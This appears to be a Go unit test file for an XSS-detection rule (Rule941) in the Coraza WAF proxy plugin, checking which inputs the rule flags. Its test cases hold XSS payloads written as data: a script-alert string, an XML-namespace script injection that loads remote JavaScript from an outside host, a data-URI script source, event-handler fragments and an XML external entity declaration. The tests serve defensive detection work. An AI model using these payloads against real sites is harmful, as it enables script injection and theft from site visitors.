package rule_941

import (
	"github.com/corazawaf/coraza-proxy-wasm/wasmplugin/rule_tasks"
	"github.com/stretchr/testify/assert"
	"reflect"
	"testing"
)

func TestMatchValue(t *testing.T) {
	rule941 := Rule941{}
	rk := rule941.matchValue("xyz", false)
	assert.False(t, rk)

	rv := rule941.matchValue("<script>alert('1');<script>", false)
	assert.True(t, rv)

	r := rule941.matchValue("xlink:href", false)
	assert.True(t, r)

	ra := rule_tasks.Re941130.MatchString(" pattern=_")
	assert.True(t, ra)

	r = rule941.matchValue("xlink:hreflang", false)

	assert.False(t, r)
}

func TestBatchMatchValue(t *testing.T) {
	type testCase struct {
		value string
		want  bool //期望的计算结果
	}

	rule941 := Rule941{}

	testGroup := map[string]testCase{
		"case1":  {"xyz", false},
		"case2":  {"<script>alert('1');<script>", true},
		"case3":  {"xlink:href", true},
		"case4":  {"xlink:hreflang", false},
		"case5":  {"formaction ", true},
		"case6":  {"pattern:m=abc", true},
		"case7":  {"!ENTITY entity_name SYSTEM \"entity_value\"", true},
		"case8":  {"!ENTITY SYSTEM", false},
		"case9":  {"abc=def:g;xyz=url(javascript", false},
		"case10": {"/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//", true},
		"case11": {"/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E", true},
		"case12": {"/char_test?mime=text/xml&body=%3Cx%20onend%3D", true},
		"case13": {"/char_test?mime=text/xml&body=%22onzoom%3D", true},
		"case14": {"/char_test?mime=text/xml&body=%27formaction%3D", true},
		"case15": {"/char_test?mime=text/xml&body=%3C%20x%3A%20script", true},
		"case16": {"/char_test?mime=text/xml&body=$%3Cf%20o%20r%20m", true},
		"case17": {"PHPSESSID%3Cf%20o%20r%20m=1234", true},
	}

	for key, v := range testGroup { //遍历
		t.Run(key, func(t *testing.T) {
			got := rule941.matchValue(v.value, false)
			want := v.want
			if !reflect.DeepEqual(want, got) { //比较
				t.Errorf("excepted:%v, got:%v", want, got)
			}
		})
	}
}
